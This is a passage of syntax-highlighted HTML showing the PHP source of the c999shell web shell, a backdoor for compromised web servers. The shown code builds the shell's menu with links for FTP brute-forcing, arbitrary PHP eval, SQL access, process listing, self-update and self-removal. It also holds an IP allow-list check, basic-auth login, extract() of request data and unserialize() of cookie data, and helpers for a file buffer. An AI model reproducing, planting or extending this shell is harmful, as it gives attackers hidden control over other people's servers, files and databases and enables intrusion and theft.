class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">history.back(1)&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img alt=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">Forward\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; src=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">act</span><span class="o">=</span><span class="nx">img</span><span class="o">&amp;</span><span class="nx">img</span><span class="o">=</span><span class="nx">forward\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; width=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; height=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; border=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">0</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">history.go(1)&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img alt=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">UPDIR\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; src=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">act</span><span class="o">=</span><span class="nx">img</span><span class="o">&amp;</span><span class="nx">img</span><span class="o">=</span><span class="nx">up\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; width=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; height=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; border=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">0</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=%upd&amp;sort=%sort&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img alt=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">Refresh\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; src=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">act</span><span class="o">=</span><span class="nx">img</span><span class="o">&amp;</span><span class="nx">img</span><span class="o">=</span><span class="nx">refresh\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; width=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">17</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; height=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; border=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">0</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img alt=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">Search\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; src=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">act</span><span class="o">=</span><span class="nx">img</span><span class="o">&amp;</span><span class="nx">img</span><span class="o">=</span><span class="nx">search\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; width=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; height=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; border=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">0</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=search&amp;d=%d&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img alt=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">Buffer\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; src=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">act</span><span class="o">=</span><span class="nx">img</span><span class="o">&amp;</span><span class="nx">img</span><span class="o">=</span><span class="nx">buffer\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; width=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; height=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; border=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">0</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=fsbuff&amp;d=%d&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Encoder&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=encoder&amp;d=%d&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Tools&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=tools&amp;d=%d&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Proc.&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=processes&amp;d=%d&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;FTP brute&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ftpquickbrute&amp;d=%d&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Sec.&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=security&amp;d=%d&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;SQL&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;d=%d&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;PHP-code&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=eval&amp;d=%d&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Update&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=update&amp;d=%d&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Feedback&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=feedback&amp;d=%d&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Self remove&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=selfremove&quot;</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Logout&amp;lt;/b&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">if (confirm(&#39;Are you sure?&#39;)) window.close()&quot;</span><span class="p">)</span>
<span class="p">);</span>
<span class="c1">//Highlight-code colors</span>
<span class="nv">$highlight_background</span> <span class="o">=</span> <span class="s2">&quot;#c0c0c0&quot;</span><span class="p">;</span>
<span class="nv">$highlight_bg</span> <span class="o">=</span> <span class="s2">&quot;#FFFFFF&quot;</span><span class="p">;</span>
<span class="nv">$highlight_comment</span> <span class="o">=</span> <span class="s2">&quot;#6A6A6A&quot;</span><span class="p">;</span>
<span class="nv">$highlight_default</span> <span class="o">=</span> <span class="s2">&quot;#0000BB&quot;</span><span class="p">;</span>
<span class="nv">$highlight_html</span> <span class="o">=</span> <span class="s2">&quot;#1300FF&quot;</span><span class="p">;</span>
<span class="nv">$highlight_keyword</span> <span class="o">=</span> <span class="s2">&quot;#007700&quot;</span><span class="p">;</span>
<span class="nv">$highlight_string</span> <span class="o">=</span> <span class="s2">&quot;#000000&quot;</span><span class="p">;</span>
<span class="o">@</span><span class="nv">$f</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;f&quot;</span><span class="p">];</span>
<span class="o">@</span><span class="nb">extract</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;c999shcook&quot;</span><span class="p">]);</span>
<span class="c1">//END CONFIGURATION</span>
<span class="c1">// \/Next code isn&#39;t for editing\/</span>
<span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nv">$tmp</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="k">foreach</span><span class="p">(</span><span class="nv">$host_allow</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$tmp</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">*&quot;</span><span class="p">,</span><span class="s2">&quot;.*&quot;</span><span class="p">,</span><span class="nb">preg_quote</span><span class="p">(</span><span class="nv">$v</span><span class="p">));}</span>
<span class="nv">$s</span> <span class="o">=</span> <span class="s2">&quot;!^(&quot;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)$!i&quot;</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">))</span> <span class="k">and</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span><span class="nb">gethostbyaddr</span><span class="p">(</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">))))</span> <span class="p">{</span><span class="k">exit</span><span class="p">(</span><span class="s2">&quot;&amp;lt;a href=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">http</span><span class="o">://</span><span class="nx">ccteam</span><span class="o">.</span><span class="nx">ru</span><span class="o">/</span><span class="nx">releases</span><span class="o">/</span><span class="nx">cc999shell\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot;&amp;gt;c999shell&amp;lt;/a&amp;gt;: Access Denied - your host (&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;) not allow&quot;</span><span class="p">);}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$login</span><span class="p">))</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$md5_pass</span><span class="p">))</span> <span class="p">{</span><span class="nv">$md5_pass</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$pass</span><span class="p">);}</span>
 <span class="k">if</span> <span class="p">((</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_AUTH_USER&quot;</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$login</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_AUTH_PW&quot;</span><span class="p">])</span> <span class="o">!=</span> <span class="nv">$md5_pass</span><span class="p">))</span>
 <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$login_txt</span><span class="p">))</span> <span class="p">{</span><span class="nv">$login_txt</span> <span class="o">=</span> <span class="nb">strip_tags</span><span class="p">(</span><span class="nb">ereg_replace</span><span class="p">(</span><span class="s2">&quot; |</span>
<span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$donated_html</span><span class="p">));}</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;WWW-Authenticate: Basic realm=</span><span class="se">\&quot;</span><span class="s2">c999shell &quot;</span><span class="o">.</span><span class="nv">$shver</span><span class="o">.</span><span class="s2">&quot;: &quot;</span><span class="o">.</span><span class="nv">$login_txt</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">);</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;HTTP/1.0 401 Unauthorized&quot;</span><span class="p">);</span>
  <span class="k">exit</span><span class="p">(</span><span class="nv">$accessdeniedmess</span><span class="p">);</span>
 <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">!=</span> <span class="s2">&quot;img&quot;</span><span class="p">)</span>
<span class="p">{</span>
<span class="nv">$lastdir</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
<span class="nb">chdir</span><span class="p">(</span><span class="nv">$curdir</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$selfwrite</span> <span class="k">or</span> <span class="nv">$updatenow</span><span class="p">)</span> <span class="p">{</span><span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="nx">c999sh_getupdate</span><span class="p">(</span><span class="nv">$selfwrite</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span> <span class="k">exit</span><span class="p">;}</span>
<span class="nv">$sess_data</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&quot;</span><span class="si">$sess_cookie</span><span class="s2">&quot;</span><span class="p">]);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sess_data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
<span class="nv">$disablefunc</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;disable_functions&quot;</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$disablefunc</span><span class="p">))</span>
<span class="p">{</span>
 <span class="nv">$disablefunc</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">);</span>
 <span class="nv">$disablefunc</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;c999_buff_prepare&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">c999_buff_prepare</span><span class="p">()</span>
<span class="p">{</span>
 <span class="k">global</span> <span class="nv">$sess_data</span><span class="p">;</span>
 <span class="k">global</span> <span class="nv">$act</span><span class="p">;</span>
 <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$v</span><span class="p">));}</span>
 <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$v</span><span class="p">));}</span>
 <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_unique</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]);</span>
 <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_unique</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]);</span>
 <span class="nb">sort</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]);</span>
 <span class="nb">sort</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]);</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">!=</span> <span class="s2">&quot;copy&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span> <span class="p">}}}</span>
 <span class="k">else</span> <span class="p">{</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);}}}</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="nx">c999_buff_prepare</span><span class="p">();</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;c999_sess_put&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">c999_sess_put</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">global</span> <span class="nv">$sess_cookie</span><span class="p">;</span>
 <span class="k">global</span> <span class="nv">$sess_data</span><span class="p">;</span>
 <span class="nx">c999_buff_prepare</span><span class="p">();</span>
 <span class="nv">$sess_data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
 <span class="nv">$data</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
 <span class="nb">setcookie</span><span class="p">(</span><span class="nv">$sess_cookie</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;sort&quot;</span><span class="p">,</span><span class="s2">&quot;sql_sort&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$v</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$$v</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nv">$v</span><span class="p">];}</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$v</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$$v</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="nv">$v</span><span class="p">];}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$sort_save</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sort</span><span class="p">))</span> <span class="p">{</span><span class="nb">setcookie</span><span class="p">(</span><span class="s2">&quot;sort&quot;</span><span class="p">,</span><span class="nv">$sort</span><span class="p">);}</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_sort</span><span class="p">))</span> <span class="p">{</span><span class="nb">setcookie</span><span class="p">(</span><span class="s2">&quot;sql_sort&quot;</span><span class="p">,</span><span class="nv">$sql_sort</span><span class="p">);}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;str2mini&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">str2mini</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="nv">$len</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$len</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="nv">$len</span> <span class="o">=</span> <span class="nb">ceil</span><span class="p">(</span><span class="nv">$len</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
  <span class="k">return</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="nv">$len</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;...&quot;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="o">-</span><span class="nv">$len</span><span class="p">);</span>
 <span class="p">}</span>
 <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="nv">$content</span><span class="p">;}</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;view_size&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">view_size</span><span class="p">(</span><span class="nv">$size</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$size</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
 <span class="k">else</span>
 <span class="p">{</span>
